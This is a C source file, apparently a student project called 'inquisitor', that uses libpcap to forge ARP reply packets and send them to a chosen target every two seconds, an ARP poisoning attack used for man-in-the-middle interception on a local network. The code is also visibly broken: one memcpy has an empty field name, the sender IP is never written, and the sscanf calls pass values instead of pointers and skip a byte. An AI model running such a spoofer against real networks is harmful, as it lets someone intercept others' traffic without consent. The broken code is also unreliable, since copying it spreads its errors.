#include "inquisitor.h"

void	signal_handler(int signo)
{
	struct pcap_stat	stats;

	if (signo == SIGINT)
	{
		printf("Exiting...\n");
		if (pcap_stats(handle, &stats) == 0)
		{
			printf("\n%d packets captured\n", packets);
			printf("%d packets received\n", stats.ps_recv);
			printf("%d packets dropped\n", stats.ps_drop);
		}
		pcap_close(handle);
		exit(0);
	}
}

static pcap_t	*create_pcap_handle(const char *dev, char *errbuf)
{
	pcap_t				*handle;
	pcap_if_t			*alldevs;
	struct bpf_program	bfp;
	bpf_u_int32			mask;
	bpf_u_int32			srcip;

	if (!*dev)
	{
		if (pcap_findalldevs(&alldevs, errbuf) == -1)
			return (NULL);
		dev = alldevs->name;
	}
	if (pcap_lookupnet(dev, &srcip, &mask, errbuf) == PCAP_ERROR)
	{
		fprintf(stderr, "pcap_lookupnet: %s\n", errbuf);
		return (NULL);
	}
	handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
	if (handle == NULL)
	{
		fprintf(stderr, "pcap_open_live: %s\n", errbuf);
		return (NULL);
	}
	if (pcap_compile(handle, &bfp, "arp", 0, mask) == PCAP_ERROR)
	{
		fprintf(stderr, "pcap_compile: %s\n", pcap_geterr(handle));
		return (NULL);
	}
	if (pcap_setfilter(handle, &bfp) == PCAP_ERROR)
	{
		fprintf(stderr, "pcap_setfilter: %s\n", pcap_geterr(handle));
		return (NULL);
	}
	return (handle);
}

static void get_link_addr(pcap_t *handle)
{
	int	link_type;

	link_type = pcap_datalink(handle);
	if (link_type == PCAP_ERROR_NOT_ACTIVATED)
	{
		fprintf(stderr, "Error: pcap handle not activated\n");
		exit(1);
	}
	switch(link_type)
	{
		case DLT_NULL:
			linkhdrlen = 4;
			break;
		case DLT_EN10MB:
			linkhdrlen = 14;
			break;
		case DLT_IEEE802:
			linkhdrlen = 22;
			break;
		case DLT_FDDI:
			linkhdrlen = 21;
			break;
		case DLT_PPP:
			linkhdrlen = 24;
			break;
		default:
			fprintf(stderr, "Error: Unsupported link type\n");
			linkhdrlen = 0;
	}
}

static void send_arp_poison(pcap_t *handle, uchar *source_ip, u_char *target_ip, u_char *source_mac, u_char *target_mac, bool verbose)
{
    u_char      packet[42];
    arphdr_t    *arpheader;  

    memset(packet, 0, sizeof(packet));
    memcpy(packet, target_mac, MAC_ADDR_LEN);
    memcpy(packet + 6, source_mac, MAC_ADDR_LEN);
    packet[12] = 0x08;
    packet[13] = 0x06;
    arpheader = (arphdr_t *)(packet + 14);
    arpheader->htype = htons(1);
    arpheader->ptype = htons(0x800);
    arpheader->hlen = MAC_ADDR_LEN;
    arpheader->plen = IP_ADDR_LEN;
    arpheader->oper = htons(2);
    memcpy(arpheader->sha, source_mac, MAC_ADDR_LEN);
    memcpy(arpheader->tha, target_mac, MAC_ADDR_LEN);
    memcpy(arpheader->, target_ip, IP_ADDR_LEN);
    if (pcap_sendpacket(handle, packet, 42) != 0)
        fprintf(stderr, "Error: error sending the ARP packet: %s\n", pcap_geterr(handle));
}

static void	check_and_start(pcap_t *handle, char *ip_src, char *mac_src, char *ip_target, char *mac_target, bool verbose)
{
    u_char  source_ip[4];
    u_char  target_ip[4];
    u_char  source_mac[MAC_ADDR_LEN];
    u_char  target_mac[MAC_ADDR_LEN];

    if (!inet_pton(AF_INET, ip_src, source_ip))
    {
        fprintf(stderr, "Invalid IP address format for source ip: %s\n", ip_src);
        exit (1);
    }
    if (!inet_pton(AF_INET, ip_target, target_ip))
    {
        fprintf(stderr, "Invalid IP address format for target ip: %s\n", ip_target);
        exit (1);
    }
    if (sscanf(mac_src, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
                source_mac[0], source_mac[1], source_mac[2],
                source_mac[4], source_mac[5]) != 6)
    {
        fprintf(stderr, "Invalid MAC address format for source MAC: %s\n", mac_src);
        exit (1);
    }
    if (sscanf(mac_target, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
                target_mac[0], target_mac[1], target_mac[2],
                target_mac[4], target_mac[5]) != 6)
    {
        fprintf(stderr, "Invalid MAC address format for target MAC: %s\n", mac_target);
        exit (1);
    }
    while (1)
    {
        send_arp_poison(handle, source_ip, target_ip, source_mac, target_mac, verbose);
        sleep(2);
    }
}

int	main(int argc, char **argv)
{
	char		errbuf[PCAP_ERRBUF_SIZE];
	const char	*dev;
	int			opt;
	bool		verbose;
	char		*ip_src;
	char		*mac_src;
	char		*ip_target;
	char		*mac_target;

	if (geteuid() != 0)
	{
		fprintf(stderr, "You must be root to run this program\n");
		exit(1);
	}
	verbose = false;
	while ((opt = getopt(argc, argv, "hi:v")) != -1)
	{
		switch(opt)
		{
			case 'h':
				printf("Usage: %s [-h] [-i interface] [-v verbose] <ip_source> <mac_source> <ip_target> <mac_target>\n", argv[0]);
				exit(0);
			case 'i':
				dev = optarg;
				break;
			case 'v':
				verbose = true;
				break;
			default:
				fprintf(stderr, "Usage: %s [-h] [-i interface] [-v verbose] <ip_source> <mac_source> <ip_target> <mac_target>\n", argv[0]);
				exit(1);
		}
	}
	if (argc - optind < 4)
	{
		fprintf(stderr, "Usage: %s [-h] [-i interface] [-v verbose] <ip_source> <mac_source> <ip_target> <mac_target>\n", argv[0]);
		exit(1);
	}
	ip_src = argv[optind];
	mac_src = argv[optind + 1];
	ip_target = argv[optind + 2];
	mac_target = argv[optind + 3];
	signal(SIGINT, signal_handler);
	handle = create_pcap_handle(dev, errbuf);
	if (handle == NULL)
	{
		printf("Error: %s\n", errbuf);
		exit(1);
	}
	printf("Filtering ARP packets on %s\n", dev);
	get_link_addr(handle);
	if (linkhdrlen == 0)
	{
		fprintf(stderr, "Error: Could not determine link-layer header length\n");
		exit(1);
	}
	check_and_start(handle, ip_src, mac_src, ip_target, mac_target, verbose);
	return (0);
}
